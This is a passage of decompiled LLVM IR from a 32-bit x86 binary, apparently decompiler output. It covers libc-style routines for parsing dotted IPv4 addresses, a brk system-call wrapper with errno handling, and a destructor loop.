284, 285, 10, 69, 70, 71, 26, 72, 27, 73, 1, 286, 20, 287, 47, 11, 288, 31, 74, 32, 75, 33, 289, 34, 35, 36, 76, 37, 38, 39, 77, 40, 78, 79, 41, 80, 42, 81, 290, 82, 43, 83, 44, 84, 291, 85, 86, 292, 45, 293, 294, 295, 296, 298, 297, 299, 300, 301, 302, 303, 304, 305, 306, 307, 21, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 48, 12, 7, 335, 49, 87, 336, 90 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 7, 6, 8, 9, 10, 11, 13, 12 }
  uselistorder i32* @esi, { 111, 112, 14, 15, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 2, 68, 69, 113, 114, 13, 115, 116, 117, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 118, 119, 120, 134, 138, 3, 139, 140, 141, 142, 143, 144, 145, 135, 136, 137, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 146, 147, 148, 149, 150, 151, 152, 0, 153, 154, 155, 156, 4, 157, 10, 158, 159, 160, 161, 162, 163, 70, 71, 5, 72, 73, 74, 75, 76, 77, 78, 79, 132, 133, 29, 32, 33, 34, 35, 36, 37, 47, 48, 38, 39, 40, 44, 43, 49, 42, 30, 31, 41, 45, 46, 50, 51, 52, 53, 54, 55, 56, 57, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 101, 100, 1, 102, 103, 104, 105, 11, 106, 164, 165, 166, 107, 108, 109, 9, 167, 168, 110, 169, 170, 6, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 7, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 12, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 8, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 271, 268, 269, 270, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292 }
  uselistorder label %dec_label_pc_8054222, { 1, 0 }
  uselistorder label %dec_label_pc_805421d, { 1, 0 }
}

define i32 @function_8054229(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054229:
  %v1_8054234 = icmp eq i8* %arg1, null
  br i1 %v1_8054234, label %dec_label_pc_80542b5, label %dec_label_pc_8054238

dec_label_pc_8054238:                             ; preds = %dec_label_pc_8054229
  %v4_8054230 = ptrtoint i8* %arg1 to i32
  %v0_8054246.pre = load i32, i32* bitcast (i32** @global_var_80560cc.224 to i32*), align 4
  br label %dec_label_pc_8054243

dec_label_pc_8054243:                             ; preds = %dec_label_pc_8054238, %dec_label_pc_805428c
  %v0_805428c = phi i32 [ 0, %dec_label_pc_8054238 ], [ %v2_8054292, %dec_label_pc_805428c ]
  %v2_805428f = phi i32 [ 1, %dec_label_pc_8054238 ], [ %v3_805428f, %dec_label_pc_805428c ]
  %v0_8054243 = phi i32 [ %v4_8054230, %dec_label_pc_8054238 ], [ %v0_80542433, %dec_label_pc_805428c ]
  %v1_8054243 = inttoptr i32 %v0_8054243 to i8*
  %v2_8054243 = load i8, i8* %v1_8054243, align 1
  %v3_8054243 = sext i8 %v2_8054243 to i32
  %v2_805424c = mul nsw i32 %v3_8054243, 2
  %v3_805424c = add i32 %v2_805424c, %v0_8054246.pre
  %v4_805424c = inttoptr i32 %v3_805424c to i8*
  %v5_805424c = load i8, i8* %v4_805424c, align 1
  %v6_805424c = and i8 %v5_805424c, 8
  %v7_805424c = icmp eq i8 %v6_805424c, 0
  br i1 %v7_805424c, label %dec_label_pc_80542b5, label %dec_label_pc_8054253

dec_label_pc_8054253:                             ; preds = %dec_label_pc_8054243
  %v4_8054267.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054267

dec_label_pc_8054257:                             ; preds = %dec_label_pc_8054267
  %v3_8054257 = mul i32 %v1_8054257, 10
  %v2_805425a = add i32 %v3_8054257, -48
  %v3_805425a = add i32 %v2_805425a, %v2_8054269
  %v1_805425e = add i32 %v3_805425a, -255
  %v6_805425e = sub i32 254, %v3_805425a
  %v7_805425e = and i32 %v6_805425e, %v3_805425a
  %v8_805425e = icmp slt i32 %v7_805425e, 0
  %v9_805425e = icmp eq i32 %v1_805425e, 0
  %v10_805425e = icmp slt i32 %v1_805425e, 0
  %v3_8054264 = icmp eq i1 %v10_805425e, %v8_805425e
  %v4_8054264 = icmp eq i1 %v9_805425e, false
  %v5_8054264 = and i1 %v4_8054264, %v3_8054264
  br i1 %v5_8054264, label %dec_label_pc_80542b5, label %dec_label_pc_8054266

dec_label_pc_8054266:                             ; preds = %dec_label_pc_8054257
  %v1_8054266 = add i32 %v0_8054266, 1
  br label %dec_label_pc_8054267

dec_label_pc_8054267:                             ; preds = %dec_label_pc_8054253, %dec_label_pc_8054266
  %v1_8054257 = phi i32 [ 0, %dec_label_pc_8054253 ], [ %v3_805425a, %dec_label_pc_8054266 ]
  %v4_8054267 = phi i32 [ %v4_8054267.pre, %dec_label_pc_8054253 ], [ %v6_8054267, %dec_label_pc_8054266 ]
  %v0_8054266 = phi i32 [ %v0_8054243, %dec_label_pc_8054253 ], [ %v1_8054266, %dec_label_pc_8054266 ]
  %v1_8054267 = inttoptr i32 %v0_8054266 to i8*
  %v2_8054267 = load i8, i8* %v1_8054267, align 1
  %v3_8054267 = zext i8 %v2_8054267 to i32
  %v5_8054267 = and i32 %v4_8054267, -256
  %v6_8054267 = or i32 %v3_8054267, %v5_8054267
  store i32 %v6_8054267, i32* @edx, align 4
  %v2_8054269 = sext i8 %v2_8054267 to i32
  %v2_805426c = mul nsw i32 %v2_8054269, 2
  %v3_805426c = add i32 %v2_805426c, %v0_8054246.pre
  %v4_805426c = inttoptr i32 %v3_805426c to i16*
  %v5_805426c = load i16, i16* %v4_805426c, align 2
  %v2_8054271 = and i16 %v5_805426c, 8
  %v3_8054271 = icmp eq i16 %v2_8054271, 0
  %v1_8054273 = icmp eq i1 %v3_8054271, false
  br i1 %v1_8054273, label %dec_label_pc_8054257, label %dec_label_pc_8054275

dec_label_pc_8054275:                             ; preds = %dec_label_pc_8054267
  %v8_8054275 = sub nsw i32 2, %v2_805428f
  %v9_8054275 = and i32 %v8_8054275, %v2_805428f
  %v10_8054275 = icmp slt i32 %v9_8054275, 0
  %v11_8054275 = icmp eq i32 %v2_805428f, 3
  %v12_8054275 = icmp slt i32 %v2_805428f, 3
  %v3_8054279 = icmp eq i1 %v12_8054275, %v10_8054275
  %v4_8054279 = icmp eq i1 %v11_8054275, false
  %v5_8054279 = and i1 %v4_8054279, %v3_8054279
  br i1 %v5_8054279, label %dec_label_pc_8054283, label %dec_label_pc_805427b

dec_label_pc_805427b:                             ; preds = %dec_label_pc_8054275
  %v10_805427b = icmp eq i8 %v2_8054267, 46
  %v1_805427e = icmp eq i1 %v10_805427b, false
  br i1 %v1_805427e, label %dec_label_pc_80542b5, label %dec_label_pc_8054280

dec_label_pc_8054280:                             ; preds = %dec_label_pc_805427b
  %v1_8054280 = add i32 %v0_8054266, 1
  br label %dec_label_pc_805428c

dec_label_pc_8054283:                             ; preds = %dec_label_pc_8054275
  %v1_8054283 = add i32 %v0_8054266, 1
  %v4_8054284 = icmp eq i8 %v2_8054267, 0
  br i1 %v4_8054284, label %dec_label_pc_805428c, label %dec_label_pc_8054288

dec_label_pc_8054288:                             ; preds = %dec_label_pc_8054283
  %v2_8054288 = and i16 %v5_805426c, 32
  %v3_8054288 = icmp eq i16 %v2_8054288, 0
  br i1 %v3_8054288, label %dec_label_pc_80542b5, label %dec_label_pc_805428c

dec_label_pc_805428c:                             ; preds = %dec_label_pc_8054288, %dec_label_pc_8054283, %dec_label_pc_8054280
  %v0_80542433 = phi i32 [ %v1_8054283, %dec_label_pc_8054288 ], [ %v1_8054283, %dec_label_pc_8054283 ], [ %v1_8054280, %dec_label_pc_8054280 ]
  %v2_805428c = mul i32 %v0_805428c, 256
  %v3_805428f = add nuw nsw i32 %v2_805428f, 1
  %v2_8054292 = or i32 %v1_8054257, %v2_805428c
  %v7_8054298 = icmp sgt i32 %v2_805428f, 3
  br i1 %v7_8054298, label %dec_label_pc_805429a, label %dec_label_pc_8054243

dec_label_pc_805429a:                             ; preds = %dec_label_pc_805428c
  %v4_805429f = icmp eq i32 %arg2, 0
  br i1 %v4_805429f, label %dec_label_pc_80542b7, label %dec_label_pc_80542a6

dec_label_pc_80542a6:                             ; preds = %dec_label_pc_805429a
  %v1_80542aa = call i32 @llvm.bswap.i32(i32 %v2_8054292)
  %v2_80542ac = inttoptr i32 %arg2 to i32*
  store i32 %v1_80542aa, i32* %v2_80542ac, align 4
  br label %dec_label_pc_80542b7

dec_label_pc_80542b5:                             ; preds = %dec_label_pc_8054288, %dec_label_pc_805427b, %dec_label_pc_8054243, %dec_label_pc_8054257, %dec_label_pc_8054229
  br label %dec_label_pc_80542b7

dec_label_pc_80542b7:                             ; preds = %dec_label_pc_805429a, %dec_label_pc_80542a6, %dec_label_pc_80542b5
  %v0_80542bc = phi i32 [ 1, %dec_label_pc_805429a ], [ 1, %dec_label_pc_80542a6 ], [ 0, %dec_label_pc_80542b5 ]
  ret i32 %v0_80542bc

; uselistorder directives
  uselistorder i32 %v2_8054269, { 1, 0 }
  uselistorder i32 %v6_8054267, { 1, 0 }
  uselistorder i8 %v2_8054267, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8054266, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805425e, { 1, 0 }
  uselistorder i32 %v3_805425a, { 1, 0, 3, 2 }
  uselistorder i32 %v2_805428f, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 256, { 1, 18, 22, 19, 2, 3, 4, 5, 0, 6, 7, 23, 16, 8, 9, 11, 10, 17, 12, 13, 14, 15, 20, 21 }
  uselistorder i32 3, { 1, 2, 0, 25, 13, 28, 6, 7, 11, 3, 8, 12, 4, 18, 19, 20, 21, 22, 23, 24, 14, 9, 10, 26, 27, 5, 29, 16, 17, 30, 15 }
  uselistorder i16 0, { 0, 1, 5, 6, 3, 4, 2 }
  uselistorder i32 -256, { 2, 24, 25, 26, 27, 28, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 7, 8, 12, 14, 16, 17, 3, 4, 5, 6, 9, 10, 11, 13, 15, 18, 19, 20, 23, 21, 22, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 54, 55, 56, 57, 0, 58, 59, 60, 1, 61, 62, 63, 64, 65 }
  uselistorder i32 -48, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 10, { 1, 15, 16, 12, 17, 2, 22, 8, 0, 3, 9, 4, 10, 5, 11, 14, 13, 18, 19, 20, 6, 21, 7, 23, 24, 25 }
  uselistorder i32* @edx, { 22, 3, 46, 47, 48, 15, 0, 17, 18, 33, 34, 35, 36, 16, 49, 50, 51, 52, 55, 54, 56, 64, 65, 4, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 5, 79, 80, 62, 63, 19, 6, 20, 81, 126, 127, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 7, 119, 120, 121, 122, 123, 124, 125, 61, 21, 58, 37, 38, 128, 60, 39, 53, 57, 40, 59, 129, 130, 1, 131, 132, 133, 8, 134, 135, 136, 137, 138, 139, 140, 9, 141, 23, 24, 26, 27, 28, 25, 13, 11, 10, 29, 14, 30, 12, 32, 31, 41, 42, 43, 44, 45, 2, 142, 143, 144, 145, 146, 147, 148 }
  uselistorder i8 0, { 45, 46, 76, 77, 59, 31, 41, 60, 6, 78, 79, 80, 81, 44, 82, 83, 84, 85, 86, 87, 32, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 2, 103, 104, 105, 106, 47, 51, 52, 53, 49, 50, 48, 54, 0, 55, 56, 57, 58, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 61, 23, 24, 62, 25, 26, 27, 28, 29, 30, 63, 64, 65, 66, 67, 5, 68, 69, 7, 70, 71, 72, 73, 74, 75, 33, 34, 107, 108, 3, 110, 111, 109, 112, 113, 114, 115, 4, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 42, 136, 1, 137, 35, 43, 36, 37, 38, 39, 40 }
  uselistorder i32 2, { 56, 58, 59, 1, 84, 22, 85, 29, 53, 0, 30, 48, 31, 49, 32, 50, 15, 2, 80, 21, 3, 4, 5, 57, 6, 7, 8, 23, 24, 86, 9, 10, 27, 11, 33, 25, 28, 36, 34, 35, 17, 16, 26, 37, 19, 38, 62, 63, 66, 76, 67, 65, 68, 69, 70, 71, 72, 73, 60, 61, 64, 74, 75, 13, 54, 77, 40, 39, 43, 41, 44, 20, 42, 12, 45, 51, 46, 52, 47, 81, 82, 83, 14, 18, 78, 79, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 55 }
  uselistorder i8* null, { 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80542b7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80542b5, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8054267, { 1, 0 }
  uselistorder label %dec_label_pc_8054243, { 1, 0 }
}

define i32 @function_80542bd() local_unnamed_addr {
dec_label_pc_80542bd:
  %v0_80542bd = load i32, i32* @eax, align 4
  %v1_80542bd = add i32 %v0_80542bd, 28
  %v2_80542bd = inttoptr i32 %v1_80542bd to i32*
  %v3_80542bd = load i32, i32* %v2_80542bd, align 4
  store i32 %v3_80542bd, i32* @global_var_8056bb8.242, align 8
  %v1_80542c6 = add i32 %v0_80542bd, 44
  %v2_80542c6 = inttoptr i32 %v1_80542c6 to i32*
  %v3_80542c6 = load i32, i32* %v2_80542c6, align 4
  store i32 %v3_80542c6, i32* @global_var_8056bbc.243, align 4
  ret i32 %v3_80542c6

; uselistorder directives
  uselistorder i32 44, { 5, 3, 2, 9, 11, 10, 6, 7, 8, 4, 12, 13, 14, 15, 0, 1 }
  uselistorder i32 28, { 26, 23, 24, 14, 15, 16, 27, 4, 5, 11, 6, 9, 10, 8, 7, 17, 18, 19, 20, 22, 21, 25, 0, 12, 28, 3, 13, 2, 1, 29, 30, 31 }
}

define i32 @function_80542cf(i32 %arg1) local_unnamed_addr {
dec_label_pc_80542cf:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80542cf = load i32, i32* @ebx, align 4
  store i32 %v0_80542cf, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_80542e2 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80542e2, i32* @global_var_80561b8.241, align 8
  %v7_80542ed = icmp ult i32 %v1_80542e2, %arg1
  %v1_80542ef = icmp eq i1 %v7_80542ed, false
  br i1 %v1_80542ef, label %dec_label_pc_80542ff, label %dec_label_pc_80542f1

dec_label_pc_80542f1:                             ; preds = %dec_label_pc_80542cf
  %v1_80542f1 = call i32 @function_8051fb9(i32 %v0_80542cf)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80542f9 = inttoptr i32 %v1_80542f1 to i32*
  store i32 12, i32* %v1_80542f9, align 4
  %v0_80542ff.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054303.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80542ff

dec_label_pc_80542ff:                             ; preds = %dec_label_pc_80542cf, %dec_label_pc_80542f1
  %v2_8054303 = phi i32 [ %v0_80542cf, %dec_label_pc_80542cf ], [ %v2_8054303.pre, %dec_label_pc_80542f1 ]
  %v0_80542ff = phi i32 [ 0, %dec_label_pc_80542cf ], [ %v0_80542ff.pre, %dec_label_pc_80542f1 ]
  store i32 %v2_8054303, i32* @ebx, align 4
  ret i32 %v0_80542ff

; uselistorder directives
  uselistorder i32 %v1_80542e2, { 1, 0 }
  uselistorder i32 12, { 120, 106, 107, 108, 109, 110, 74, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 75, 76, 77, 78, 79, 80, 136, 154, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 66, 153, 67, 111, 112, 113, 114, 115, 62, 69, 63, 70, 64, 71, 65, 72, 83, 84, 93, 94, 95, 85, 89, 96, 90, 91, 88, 97, 81, 82, 86, 87, 28, 92, 98, 105, 99, 61, 100, 102, 103, 73, 101, 116, 0, 117, 118, 119, 29, 30, 31, 32, 33, 34, 104, 1, 2, 26, 10, 9, 8, 16, 59, 21, 38, 39, 37, 17, 44, 36, 42, 43, 18, 155, 7, 40, 41, 4, 6, 35, 156, 60, 157, 161, 158, 159, 160, 45, 46, 47, 48, 19, 20, 49, 50, 51, 162, 52, 53, 54, 55, 56, 57, 58, 5, 22, 23, 11, 12, 13, 14, 15, 163, 24, 3, 25, 164, 165, 27, 68 }
  uselistorder i32* @global_var_80561b8.241, { 1, 0, 2 }
  uselistorder i32 45, { 1, 3, 0, 4, 2 }
  uselistorder label %dec_label_pc_80542ff, { 1, 0 }
}

define i32 @function_8054305() local_unnamed_addr {
dec_label_pc_8054305:
  %v0_8054308 = load i32, i32* @eax, align 4
  %v1_805430a = sub i32 0, %v0_8054308
  %v1_805430c = call i32 @function_8051fb9(i32 ptrtoint (i32* @0 to i32))
  %v2_8054311 = inttoptr i32 %v1_805430c to i32*
  store i32 %v1_805430a, i32* %v2_8054311, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_8051fb9, { 35, 34, 51, 33, 32, 55, 43, 31, 56, 30, 29, 28, 42, 41, 40, 57, 27, 26, 25, 23, 22, 21, 39, 38, 54, 2, 16, 3, 53, 52, 37, 36, 15, 50, 14, 9, 18, 17, 49, 8, 13, 12, 48, 24, 20, 47, 11, 19, 10, 7, 46, 6, 5, 45, 44, 0, 4, 1 }
  uselistorder i32* @0, { 2, 3, 4, 5, 6, 7, 0, 8, 9, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 7, 27, 28, 11, 14, 8, 9, 10, 15, 13, 29, 30, 31, 32, 12, 33, 16, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 83, 82, 187, 81, 115, 116, 167, 168, 169, 117, 118, 114, 135, 134, 130, 131, 132, 133, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 84, 170, 171, 172, 173, 174, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 188, 189, 190, 191, 192, 193 }
}

define i32 @function_8054320() local_unnamed_addr {
dec_label_pc_8054320:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805432c = load i32, i32* @global_var_8056044.228, align 4
  %v10_8054331 = icmp eq i32 %v0_805432c, -1
  br i1 %v10_8054331, label %dec_label_pc_8054342, label %dec_label_pc_8054336.preheader

dec_label_pc_8054336.preheader:                   ; preds = %dec_label_pc_8054320
  br label %dec_label_pc_8054336

dec_label_pc_8054336:                             ; preds = %dec_label_pc_8054336.preheader, %dec_label_pc_8054336
  %v4_8054339 = phi i32 [ %v0_805432c, %dec_label_pc_8054336.preheader ], [ %v2_805433b, %dec_label_pc_8054336 ]
  %v0_8054336 = phi i32 [ ptrtoint (i32* @global_var_8056044.228 to i32), %dec_label_pc_8054336.preheader ], [ %v1_8054336, %dec_label_pc_8054336 ]
  %v1_8054336 = add i32 %v0_8054336, -4
  call void @__pseudo_call(i32 %v4_8054339)
  %v1_805433b = inttoptr i32 %v1_8054336 to i32*
  %v2_805433b = load i32, i32* %v1_805433b, align 4
  %v10_805433d = icmp eq i32 %v2_805433b, -1
  %v1_8054340 = icmp eq i1 %v10_805433d, false
  br i1 %v1_8054340, label %dec_label_pc_8054336, label %dec_label_pc_8054342.loopexit

dec_label_pc_8054342.loopexit:                    ; preds = %dec_label_pc_8054336
  %v2_8054342.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8054342

dec_label_pc_8054342:                             ; preds = %dec_label_pc_8054342.loopexit, %dec_label_pc_8054320
  %v2_8054342 = phi i32 [ %v2_8054342.pre, %dec_label_pc_8054342.loopexit ], [ %tmp6, %dec_label_pc_8054320 ]
  ret i32 %v2_8054342

; uselistorder directives
  uselistorder i32 %v0_805432c, { 1, 0 }
  uselistorder i1 false, { 110, 111, 36, 37, 39, 38, 112, 113, 114, 82, 83, 115, 118, 119, 120, 121, 122, 124, 11, 125, 126, 123, 117, 116, 24, 127, 128, 129, 1, 131, 132, 0, 133, 84, 85, 86, 87, 88, 89, 12, 134, 135, 136, 3, 137, 138, 139, 140, 2, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 141, 25, 26, 27, 28, 29, 30, 31, 32, 33, 154, 155, 156, 157, 158, 159, 160, 161, 162, 10, 164, 163, 168, 165, 166, 167, 13, 169, 170, 130, 34, 4, 35, 171, 172, 15, 90, 91, 92, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 16, 183, 93, 94, 95, 184, 185, 186, 5, 40, 6, 187, 188, 189, 43, 51, 56, 52, 53, 55, 41, 42, 44, 45, 46, 47, 48, 49, 50, 54, 57, 58, 81, 59, 60, 19, 80, 61, 18, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 79, 75, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 76, 77, 78, 190, 191, 192, 193, 194, 7, 196, 197, 198, 195, 199, 200, 201, 202, 203, 204, 8, 205, 206, 207, 208, 17, 209, 210, 211, 212, 213, 214, 215, 21, 20, 216, 22, 217, 218, 219, 220, 9, 23, 14, 221 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 15, 16, 17, 18, 98, 99, 100, 101, 11, 102, 3, 97, 19, 93, 12, 94, 95, 96, 13, 0, 9, 10, 103, 104, 105, 106, 107, 108, 109, 14, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 7, 53, 8, 54, 55, 56, 2, 6, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 4, 5, 85, 86, 87, 88, 89, 90, 91, 1, 92 }
  uselistorder i32 ptrtoint (i32* @global_var_8056044.228 to i32), { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 -1, { 27, 28, 0, 117, 202, 72, 118, 73, 74, 119, 75, 120, 76, 121, 77, 122, 78, 123, 79, 124, 80, 125, 81, 126, 82, 127, 25, 26, 13, 12, 83, 84, 128, 85, 129, 86, 130, 29, 1, 131, 71, 87, 88, 132, 133, 134, 15, 135, 14, 136, 90, 89, 137, 203, 17, 18, 138, 16, 139, 30, 204, 31, 140, 205, 34, 33, 35, 36, 22, 37, 91, 38, 141, 32, 206, 11, 142, 143, 113, 144, 19, 39, 2, 92, 207, 208, 93, 200, 40, 94, 145, 95, 146, 96, 147, 69, 70, 148, 97, 149, 98, 150, 99, 151, 100, 152, 101, 153, 102, 154, 103, 155, 104, 156, 105, 157, 106, 158, 107, 159, 108, 160, 109, 161, 110, 162, 111, 163, 41, 164, 165, 3, 166, 20, 4, 167, 42, 168, 112, 209, 114, 43, 169, 196, 170, 171, 197, 192, 48, 172, 173, 198, 44, 174, 175, 176, 177, 178, 179, 193, 180, 181, 182, 183, 184, 47, 185, 194, 45, 46, 186, 195, 187, 188, 199, 49, 189, 190, 5, 50, 23, 6, 51, 191, 21, 10, 9, 8, 7, 52, 201, 53, 54, 55, 56, 57, 24, 58, 210, 211, 212, 59, 213, 214, 65, 60, 215, 61, 62, 63, 64, 216, 66, 217, 67, 68, 218, 219, 115, 116 }
  uselistorder i32 1, { 250, 251, 49, 150, 151, 387, 388, 389, 390, 152, 457, 252, 21, 20, 22, 253, 25, 24, 23, 254, 80, 255, 257, 256, 26, 259, 258, 102, 260, 92, 261, 31, 262, 110, 263, 81, 264, 112, 265, 111, 266, 113, 267, 268, 94, 93, 95, 172, 98, 270, 269, 272, 271, 101, 273, 10, 275, 274, 99, 276, 280, 279, 278, 277, 100, 458, 459, 460, 283, 282, 281, 34, 35, 33, 153, 284, 286, 285, 114, 154, 236, 381, 137, 292, 291, 290, 289, 288, 287, 41, 42, 173, 293, 421, 422, 423, 234, 424, 294, 37, 40, 38, 36, 39, 155, 237, 297, 296, 295, 115, 174, 462, 463, 464, 298, 72, 465, 466, 156, 467, 468, 469, 91, 89, 90, 238, 461, 175, 104, 105, 106, 107, 176, 157, 383, 384, 385, 386, 301, 300, 299, 47, 46, 45, 48, 177, 302, 17, 18, 179, 470, 471, 472, 473, 474, 475, 476, 477, 478, 178, 479, 480, 481, 482, 483, 158, 484, 485, 122, 159, 486, 487, 488, 489, 160, 161, 490, 491, 492, 304, 303, 83, 82, 84, 86, 85, 162, 163, 305, 164, 165, 180, 309, 308, 307, 306, 87, 181, 239, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 182, 183, 326, 325, 327, 166, 330, 329, 328, 30, 184, 331, 332, 7, 333, 121, 335, 334, 88, 336, 19, 337, 108, 103, 339, 338, 32, 340, 9, 341, 27, 8, 343, 342, 50, 344, 97, 346, 345, 119, 348, 347, 109, 349, 118, 351, 350, 96, 352, 51, 353, 53, 52, 493, 494, 495, 496, 235, 354, 15, 11, 14, 12, 13, 16, 497, 498, 123, 124, 499, 500, 0, 501, 502, 503, 504, 505, 185, 506, 186, 507, 356, 355, 116, 425, 167, 79, 78, 508, 168, 226, 509, 510, 169, 511, 512, 187, 513, 126, 43, 44, 391, 127, 357, 70, 71, 69, 514, 515, 516, 358, 4, 5, 3, 6, 517, 518, 244, 57, 59, 58, 61, 60, 519, 245, 54, 55, 56, 394, 395, 396, 397, 398, 399, 406, 203, 204, 191, 403, 193, 407, 189, 404, 199, 402, 201, 392, 202, 197, 393, 198, 400, 195, 401, 196, 200, 192, 190, 188, 405, 408, 205, 194, 409, 410, 412, 420, 411, 413, 414, 415, 416, 418, 206, 419, 74, 76, 75, 73, 77, 417, 240, 359, 120, 207, 170, 241, 360, 362, 361, 138, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 208, 436, 437, 438, 439, 149, 209, 242, 210, 243, 456, 211, 367, 366, 365, 364, 363, 117, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 372, 371, 246, 249, 370, 369, 247, 368, 28, 29, 1, 227, 2, 139, 140, 520, 521, 522, 523, 524, 128, 129, 525, 526, 527, 528, 529, 215, 131, 132, 214, 133, 218, 134, 530, 531, 216, 135, 136, 217, 532, 130, 125, 533, 534, 535, 536, 537, 228, 141, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 222, 148, 147, 548, 229, 142, 549, 550, 551, 552, 553, 219, 554, 555, 220, 556, 230, 143, 557, 231, 144, 558, 559, 232, 145, 560, 561, 233, 146, 562, 563, 564, 565, 566, 221, 567, 569, 570, 568, 223, 571, 572, 573, 574, 212, 213, 575, 576, 577, 578, 224, 382, 225, 579, 171, 379, 378, 377, 376, 375, 374, 373, 248, 68, 63, 65, 62, 66, 64, 67, 380 }
  uselistorder label %dec_label_pc_8054336, { 1, 0 }
}

define i32 @function_8054346() local_unnamed_addr {
entry:
  %v0_8054349 = load i32, i32* @ebx, align 4
  %v1_805434a = call i32 @function_80480b0(i32 %v0_8054349)
  store i32 %v1_805434a, i32* @eax, align 4
  %v0_8054355 = call i32 @function_80480c0()
  ret i32 %v0_8054355

; uselistorder directives
